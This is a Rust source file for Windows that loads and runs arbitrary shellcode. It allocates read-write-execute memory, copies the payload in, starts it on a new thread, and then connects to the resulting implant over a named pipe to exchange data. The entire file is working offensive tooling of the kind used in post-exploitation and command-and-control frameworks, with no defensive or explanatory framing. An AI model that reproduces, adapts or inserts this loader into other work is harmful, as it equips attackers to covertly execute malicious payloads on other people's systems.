use std::{
    ffi::c_void,
    io::{Error, ErrorKind},
    mem, ptr,
};
use windows::{
    core::{Error as WinError, PCSTR},
    Win32::{
        Foundation::{CloseHandle, HANDLE},
        Storage::FileSystem::{
            CreateFileA, ReadFile, WriteFile, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ,
            FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
        },
        System::{
            Memory::{VirtualAlloc, MEM_COMMIT, PAGE_EXECUTE_READWRITE},
            Pipes::WaitNamedPipeA,
            Threading::{
                CreateThread, LPTHREAD_START_ROUTINE, THREAD_CREATE_RUN_IMMEDIATELY,
            },
            IO::OVERLAPPED,
        },
    },
};

pub struct Implant {
    handle: HANDLE,
}
impl Drop for Implant {
    fn drop(&mut self) {
        unsafe {
            CloseHandle(self.handle);
        }
    }
}
impl Implant {
    pub fn read(&self, size: usize) -> Result<Vec<u8>, Error> {
        let mut out: Vec<u8> = vec![0; size];
        let mut bytes_read: u32 = 0;
        unsafe {
            if ReadFile(
                self.handle,
                out.as_mut_ptr() as *mut c_void,
                size.try_into().unwrap_or(u32::MAX),
                &mut bytes_read as *mut u32,
                ptr::null_mut() as *mut OVERLAPPED,
            )
            .as_bool()
            {
                out.truncate(bytes_read.try_into().unwrap());
                return Ok(out);
            } else {
                return Err(WinError::from_win32().into());
            };
        }
    }

    pub fn write(&self, data: Vec<u8>) -> Result<u32, Error> {
        let mut bytes_written: u32 = 0;
        unsafe {
            if WriteFile(
                self.handle,
                data.as_ptr() as *const c_void,
                data.len().try_into().unwrap_or(u32::MAX),
                &mut bytes_written as *mut u32,
                ptr::null_mut() as *mut OVERLAPPED,
            )
            .as_bool()
            {
                return Ok(bytes_written);
            } else {
                return Err(WinError::from_win32().into());
            };
        }
    }
}

pub fn create_implant_from_buf(
    shell_code: Vec<u8>,
    socket_path: &str,
) -> Result<Implant, Error> {
    unsafe {
        let buf =
            VirtualAlloc(ptr::null(), 512 * 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
                as *mut u8;
        ptr::copy(shell_code.as_ptr(), buf, shell_code.len());
        let buf_addr: unsafe extern "system" fn(*mut c_void) -> u32 =
            mem::transmute(buf);
        let mut threadid: u32 = 0;

        CreateThread(
            ptr::null(),
            0,
            LPTHREAD_START_ROUTINE::Some(buf_addr),
            ptr::null(),
            THREAD_CREATE_RUN_IMMEDIATELY,
            &mut threadid as *mut u32,
        )?;
        if !WaitNamedPipeA(PCSTR(socket_path.as_ptr()), 0).as_bool() {
            return Err(Error::new(ErrorKind::TimedOut, "Failed waiting for pipe"));
        }
        let sock_handle = CreateFileA(
            PCSTR(socket_path.as_ptr()),
            FILE_GENERIC_READ | FILE_GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            ptr::null(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE::default(),
        )?;

        return Ok(Implant {
            handle: sock_handle,
        });
    }
}
